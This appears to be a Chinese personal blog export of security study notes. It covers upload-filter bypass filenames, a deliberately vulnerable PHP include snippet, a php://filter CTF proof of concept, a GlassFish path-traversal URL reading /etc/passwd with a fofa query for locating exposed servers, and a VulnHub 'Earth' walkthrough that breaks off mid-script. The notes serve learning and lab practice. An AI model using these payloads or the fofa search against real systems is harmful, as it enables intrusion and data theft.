<p>5,如果都没有则再来到编辑器漏洞，判断编辑器类型，搜索漏洞</p>
<p>6,没有就查找是否爆出过cve词条漏洞</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20220908201230886.png">#上传参数名解析：明确哪些东西能修改？</p>
<p>Content-Disposition：表单数据 一般可更改</p>
<p>name：表单参数值，不能更改</p>
<p>filename：文件名，可以更改</p>
<p>Content-Type：上传文件带的参数值 文件 MIME，视情况更改</p>
<p>#常见绕过方法：</p>
<p>数据溢出-防匹配(xxx…)</p>
<p>符号变异-防匹配（</p>
<p>‘ “ ;）</p>
<p>数据截断-防匹配(%00 ; 换行)</p>
<p>重复数据-防匹配(参数多次)</p>
<p>#Payload:</p>
<p>大量垃圾数据缓冲溢出(Content-Disposition,filename 等)</p>
<p>filename=x.php</p>
<p>filename=”x.php</p>
<p>filename=’x.php</p>
<p>filename=”a.jpg;.php”;</p>
<p>filename=”a.php%00.jpg”</p>
<p>filename=”Content-Disposition: form-data; name=”upload_file”;x.php”</p>
<p>filename=”x.jpg”;filename=”x.jpg”;…..filename=”x.php”;</p>
<p>filename=”xxx/x.jpg”</p>
<p>filename=</p>
<p>“</p>
<p>x</p>
<p>.</p>
<p>p</p>
<p>h</p>
<p>p</p>
<p>“</p>
<p>/jpeg；/x.php   xxxx/x.php</p>
<h3 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p>
<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
<p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
<h2 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h2><p><strong>跨网站脚本（Cross-site scripting，XSS）</strong> 又称为跨站脚本攻击，是一种经常出现在Web应用程序的安全漏洞攻击，也是代码注入的一种。XSS是由于Web应用程序对用户的输入过滤不足而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。这类攻击通常包含了HTML以及用户端脚本语言。</p>
<h2 id="CSRF和SSRF"><a href="#CSRF和SSRF" class="headerlink" title="CSRF和SSRF"></a>CSRF和SSRF</h2><h3 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h3><p>使用burp里自带的工具</p>
<p><img src="/imgs/$%7Bfiilename%7D/20221017191959.png"></p>
<p>此漏洞利用：修改信息，添加管理员</p>
<p>注意网站有无添加，修改功能才可能有csrf漏洞存在</p>
<p>如果测试后没有变化，网站不存在这个漏洞</p>
<ol>
<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</li>
<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
</ol>
<h3 id="ssrf-服务器请求伪造"><a href="#ssrf-服务器请求伪造" class="headerlink" title="ssrf 服务器请求伪造"></a>ssrf 服务器请求伪造</h3><p>影响到内部系统</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210408290.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210429653.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210449078.png"></p>
<p><a href="https://blog.csdn.net/weixin_45663905/article/details/108086622">服务器端请求伪造——SSRF_ihszg的博客-CSDN博客_伪造发包服务器</a></p>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>可控制变量</p>
<p>使用函数造成的效果</p>
<p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。被包含的文件在第三方服务器时，就形成了远程文件包含漏洞。</p>
<p>　　本地到远程：如果php.ini的配置选项allow_url_fopen和allow_url_include为ON的话，则文件包含函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
<p>　　include()：当使用该函数包含文件时，只有代码执行到include（）函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p>
<p>　　include_once()：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</p>
<p>　　require()：跟include唯一不同的是，当产生错误时，include下面继续运行而require停止运行了。</p>
<p>　　require_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>　　看到这四个函数时，看到有参数，且参数可控，没有过滤，或过滤不严，就一定有文件包含漏洞。</p>
<p>常见漏洞代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[page]))&#123; include $_GET[page];&#125; else&#123;include&quot;home.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>　触发漏洞的条件：</p>
<p>　　　　web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件。</p>
<p>　　　　用户能够控制该动态变量。</p>
<h2 id="文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞"><a href="#文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞" class="headerlink" title="文件包含漏洞概括： 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞"></a>文件包含漏洞概括：<a href="https://blog.csdn.net/Vansnc/article/details/82528395"> 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞</a></h2><h2 id="文件包含漏洞伪协议利用补充："><a href="#文件包含漏洞伪协议利用补充：" class="headerlink" title="文件包含漏洞伪协议利用补充："></a>文件包含漏洞伪协议利用补充：</h2><h3 id="php-filter的各种过滤器"><a href="#php-filter的各种过滤器" class="headerlink" title="php://filter的各种过滤器"></a>php://filter的各种过滤器</h3><p>官方文档介绍的可用过滤器列表：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
<p>应用链接：<a href="https://blog.csdn.net/qq_44657899/article/details/109300335"> php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
<p>使用例子链接:</p>
<p>file_include：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3</a></p>
<p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
<p>文件包含的绕过或许也可以尝试一下过滤器绕过的思路</p>
<p>在这题ctf例题中就是采用的过滤器绕过思路中的</p>
<p>0x02 Conversion Filters（转换过滤器）</p>
<p>转换过滤器里的convert.iconv.*</p>
<p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的（、iconv不是php的默认函数，也是默认安装的模块。需要安装才能用的。）。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;input-encoding&gt;和&lt;output-encoding&gt;</code> 就是编码方式，有如下几种;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=2.php</span><br></pre></td></tr></table></figure>

<p>在本例题中</p>
<p>知道绕过方式后我们回显check.php里面的源码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=check.php</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114012.png"></p>
<p>如图,本题对过滤器进行了限制,还限制了convert.iconv.*过滤器里的编码类型.但好在该过滤器支持的编码类型多样,所以换种编码类型也能达到绕过效果,(多试几种编码类型)</p>
<p>本题通关poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114526.png"></p>
<p>这还有一题也是ctf里面的文件包含形式，这题的过滤代码更多</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025155125.png"></p>
<p>也是使用这个过滤器问题，多试几次过滤器里面的编码形式就可以得出答案了。</p>
<p>所以文件包含的绕过思路绝不止一种,多试试.</p>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>博客文章编写方式</title>
    <url>/2022/10/15/17-58-19/</url>
    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>



<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
<p>然后就是上传图片的操作了</p>
<p>这是原帖子链接</p>
<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
<p>下面我先简单演示</p>
<p>创建一个新的imgs文件夹,位于</p>
<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
<p>source 目录下</p>
<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
<p>在”格式””图像””设置图片根目录”</p>
<p>成功后</p>
<p>如图:</p>
<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
<p>随后就是插入图片</p>
<p>在”格式” “图像” “插入图片”</p>
<p>一定要记得将图片放在imgs 文件夹中</p>
<p>这样引用图片时才不会出错</p>
<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
<p>最后放上我可爱的草神:</p>
<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
]]></content>
      <categories>
        <category>使用说明</category>
      </categories>
      <tags>
        <tag>hexo博客搭建说明</tag>
      </tags>
  </entry>
  <entry>
    <title>应用服务器glassfish任意文件读取漏洞</title>
    <url>/2022/11/13/15-34-05/</url>
    <content><![CDATA[<h1 id="应用服务器glassfish任意文件读取漏洞"><a href="#应用服务器glassfish任意文件读取漏洞" class="headerlink" title="应用服务器glassfish任意文件读取漏洞"></a>应用服务器glassfish任意文件读取漏洞</h1><h2 id="漏洞编号：wooyun-2010-0144595"><a href="#漏洞编号：wooyun-2010-0144595" class="headerlink" title="漏洞编号：wooyun-2010-0144595"></a>漏洞编号：wooyun-2010-0144595</h2><h2 id="影响版本-glass-fish4-0至4-1这两个大版本"><a href="#影响版本-glass-fish4-0至4-1这两个大版本" class="headerlink" title="影响版本:  glass fish4.0至4.1这两个大版本"></a>影响版本:  glass fish4.0至4.1这两个大版本</h2><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>

<p>该漏洞标题写的是任意文件读取漏洞，其实该漏洞同样可以列出对应目录文件，基本上等同于源代码泄露，各种敏感信息暴露无遗。</p>
<p>该漏洞分为windows和linux 系统</p>
<p>4848端口为glassfish默认开放的web管理端口</p>
<p>使用%c0%ae%c0%ae/这一个java中的特殊方式可直接跳转目录，获得目录文件列表。</p>
<p>读取web应用配置文件，如（web.xml,数据库配置文件，web系统日志）等敏感文件;</p>
<p>针对特定的文件可进一步读取其内容。</p>
<p>fofa搜索语句:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;glassfish &quot; &amp;&amp; &quot;4.0&quot; &amp;&amp; port=&quot;4848&quot;</span><br></pre></td></tr></table></figure>

<p>虽然是几年前的了,但到目前了影响的公司,漏洞存在的公司还是有很多滴.</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108125019-1668327385931.png"></p>
]]></content>
      <categories>
        <category>任意文件读取</category>
      </categories>
      <tags>
        <tag>漏洞库</tag>
      </tags>
  </entry>
  <entry>
    <title>内网学习笔记</title>
    <url>/2022/10/19/10-49-13/</url>
    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
      </tags>
  </entry>
  <entry>
    <title>测试</title>
    <url>/2024/03/25/18-17-01/</url>
    <content><![CDATA[<h1 id="博客重开"><a href="#博客重开" class="headerlink" title="博客重开"></a>博客重开</h1><h2 id="项目书写"><a href="#项目书写" class="headerlink" title="项目书写"></a>项目书写</h2><p>测试测试测试</p>
<p><img src="/imgs/$%7Bfiilename%7D/R.png" alt="R"></p>
]]></content>
      <categories>
        <category>使用说明</category>
      </categories>
      <tags>
        <tag>hexo博客搭建说明</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次vulnhub靶场Earth的渗透测试</title>
    <url>/2022/10/16/17-55-35/</url>
    <content><![CDATA[<h1 id="记一次vulnhub-靶场-THE-PLANETS-EARTH-靶机渗透攻击思路"><a href="#记一次vulnhub-靶场-THE-PLANETS-EARTH-靶机渗透攻击思路" class="headerlink" title="记一次vulnhub 靶场:THE PLANETS:EARTH 靶机渗透攻击思路"></a>记一次vulnhub 靶场:THE PLANETS:EARTH 靶机渗透攻击思路</h1><h2 id="首先是解决遇到的问题"><a href="#首先是解决遇到的问题" class="headerlink" title="首先是解决遇到的问题:"></a>首先是解决遇到的问题:</h2><p>1.在安装过程中VMware遇到了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">earth靶机未通过 OVF 规范一致性或虚拟硬件合规性检查。</span><br><span class="line"></span><br><span class="line">请单击“重试”放松 OVF 规范与虚拟硬件合规性检查，并重新尝试导入；或单击“取消”以取消导入。如果重新尝试导入，可能无法使用 VMware Workstation 中的虚拟机。</span><br></pre></td></tr></table></figure>

<p>此问题搜索了许久,还换了一次ofvtool工具文件夹,但最后发现我的ofvtool工具就是最新的4.43版本,圈圈绕绕后转回来点击重试就能运了,其他虚拟机也重启后正常运行.</p>
<p>2.在使用kill扫描端口开放以及IP地址时发现无法扫描到靶机实际IP地址,最后检查发现是虚拟机与物理机的网络桥接模式没有选择正确.</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012103302643.png"></p>
<p>如图,选项NAT模式即可.</p>
<h1 id="正式进入渗透测试"><a href="#正式进入渗透测试" class="headerlink" title="正式进入渗透测试"></a>正式进入渗透测试</h1><h2 id="1-使用kali自带的nmap进行信息收集"><a href="#1-使用kali自带的nmap进行信息收集" class="headerlink" title="1.使用kali自带的nmap进行信息收集"></a>1.使用kali自带的nmap进行信息收集</h2><h3 id="进入kali的root权限"><a href="#进入kali的root权限" class="headerlink" title="进入kali的root权限"></a>进入kali的root权限</h3><p>进入命令行界面,使用:sudo su 命令</p>
<p>输入开机密码后就可以进入root权限</p>
<p>使用 arp-scan -l 命令获取在同一网段下的ip地址,</p>
<p>得:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012104134314.png"></p>
<p>箭头指向地址就是靶机实际IP.</p>
<h3 id="使用nmap进行信息收集"><a href="#使用nmap进行信息收集" class="headerlink" title="使用nmap进行信息收集:"></a>使用nmap进行信息收集:</h3><p>命令:</p>
<p>nmap -O -sV -p- -A 192.168.50.128 -oN earth_namp.txt  </p>
<p>导出成为txt 文档.</p>
<p>信息如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Nmap 7.92 scan initiated Tue Oct 11 21:36:06 2022 as: nmap -O -sV -p- -A -oN earth_namp.txt 192.168.50.128</span><br><span class="line">Nmap scan report for bogon (192.168.50.128)</span><br><span class="line">Host is up (0.00081s latency).</span><br><span class="line">Not shown: 65375 filtered tcp ports (no-response), 157 filtered tcp ports (admin-prohibited)</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)</span><br><span class="line">|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span><br><span class="line">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span><br><span class="line">| Not valid before: 2021-10-12T23:26:31</span><br><span class="line">|_Not valid after:  2031-10-10T23:26:31</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">MAC Address: 00:0C:29:08:9F:5A (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.81 ms bogon (192.168.50.128)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct 11 21:38:56 2022 -- 1 IP address (1 host up) scanned in 169.57 seconds</span><br></pre></td></tr></table></figure>

<h3 id="在80端口发现400网站"><a href="#在80端口发现400网站" class="headerlink" title="在80端口发现400网站"></a>在80端口发现400网站</h3><p><img src="/imgs/$%7Bfiilename%7D/image-20221012124608601.png"></p>
<h3 id="443发现两个DNS缓存"><a href="#443发现两个DNS缓存" class="headerlink" title="443发现两个DNS缓存"></a>443发现两个DNS缓存</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span><br><span class="line">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span><br></pre></td></tr></table></figure>

<p>运用kali命令</p>
<p>vim /etc/hosts</p>
<p>破解DNS缓存</p>
<p>修改信息如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	kali2020.kali2020.com	kali2020</span><br><span class="line"></span><br><span class="line">192.168.50.128   earth.local </span><br><span class="line"></span><br><span class="line">192.168.50.128   terratest.earth.local</span><br><span class="line"></span><br><span class="line">#The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>

<p>修改后进入</p>
<p>earth.local </p>
<p>terratest.earth.local</p>
<p>得到如下图</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012124520459.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012185423361.png"></p>
<p>发现两个网站都可以打开了.</p>
<p>在网站下面发现了以前的消息,尝试复制粘贴进去,随便输入了个key,发现并没有返回.</p>
<h3 id="尝试扫描此网站"><a href="#尝试扫描此网站" class="headerlink" title="尝试扫描此网站"></a>尝试扫描此网站</h3><p>发现两个地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---- Scanning URL: http://earth.local/ ----</span><br><span class="line">+ http://earth.local/admin (CODE:301|SIZE:0)                                </span><br><span class="line">+ http://earth.local/cgi-bin/ (CODE:403|SIZE:199)                           </span><br><span class="line">                                                      </span><br></pre></td></tr></table></figure>



<p>一个admin登录界面</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012130229099.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012130305796.png"></p>
<p>在此尝试弱口令登录</p>
<p>简单尝试后发现并没有弱口令(有那么容易就不会出这个靶机了)</p>
<p>尝试在网址框进行报错显示</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012130727867.png"></p>
<p>无法得到有用信息</p>
<p>没有回显而且不像真实网站一样拥有多样化的页面,很难判断出其他信息.</p>
<p>另一个是403页面</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012152918008.png"></p>
<p>另一个网址<a href="http://terratest.earth.local/">http://terratest.earth.local/</a></p>
<p>扫到的网址目录也一样</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012153602283.png"></p>
<p>那么可以尝试更深的扫描</p>
<p>不知道是哪里出错,两个网站都只能扫到admin/login</p>
<p>无法获取到更多信息</p>
<p>md,一直在纠结dirsearch工具,忘了自带的dirb工具</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012182212027.png"></p>
<p>使用dirb命令成功扫到网站目录文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                                                            + https://terratest.earth.local/cgi-bin/ (CODE:403|SIZE:199)                </span><br><span class="line">+ https://terratest.earth.local/index.html (CODE:200|SIZE:26)               </span><br><span class="line">+ https://terratest.earth.local/robots.txt (CODE:200|SIZE:521)              </span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>

<h3 id="得到关键页面"><a href="#得到关键页面" class="headerlink" title="得到关键页面"></a>得到关键页面</h3><p>打开 index.html页面发现</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012183013108-1665916080230.png"></p>
<p>页面显示为: 测试站点，请忽略</p>
<p>继续浏览下一个 robots.txt 页面</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012183252084.png"></p>
<p>得到如图</p>
<p>我们知道 robots.txt 页面主要是</p>
<p>Robots.txt文件是网站跟爬虫间的协议，对于专业SEO并不陌生，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
<p>所以在这个页面里面的文件都是我们能访问的</p>
<p>在页面中我们能知道的文件名只有: testingnotes.*  不知道改文件的后缀</p>
<p>所以我们就要尝试进行后缀名猜测</p>
<p>在这里我们通过别人的攻略可知这是一个.txt文件</p>
<p>访问后内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>翻译一下:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012184433457.png"></p>
<p>翻译一下</p>
<h2 id="发现得到账户名是-terra"><a href="#发现得到账户名是-terra" class="headerlink" title="发现得到账户名是: terra"></a>发现得到账户名是: terra</h2><p>还有一个测试数据文档:testdata.txt</p>
<p>尝试访问这个文档</p>
<p>访问成功:</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012184727285.png"></p>
<p>翻译一下</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221012184817190.png"></p>
<p>得到了一串看似无用的信息</p>
<p>经过攻略的查找我发现我忽略了一个很重要的信息</p>
<p>*使用XOR<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>作为算法，应该是安全的RSA使用。</p>
<p>testdata.txt用于测试加密。</p>
<p>该账号的登陆密码是使用XOR加密的,所以里面的teatdata.txt文件应该是该密码的加密密文</p>
<p>而网站显示出来的key很可能就是密钥</p>
<p>使用密文密钥解密很可能就能拿到登陆密码</p>
<p>所以我们得进行解密</p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>搜索攻略,按照攻略的做法直接使用kali 解密</p>
<p>然后进入vim xor.py      后创立文档并写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">key1=&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d1&quot;                                   </span><br><span class="line"></span><br><span class="line">decode_txt=b&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, 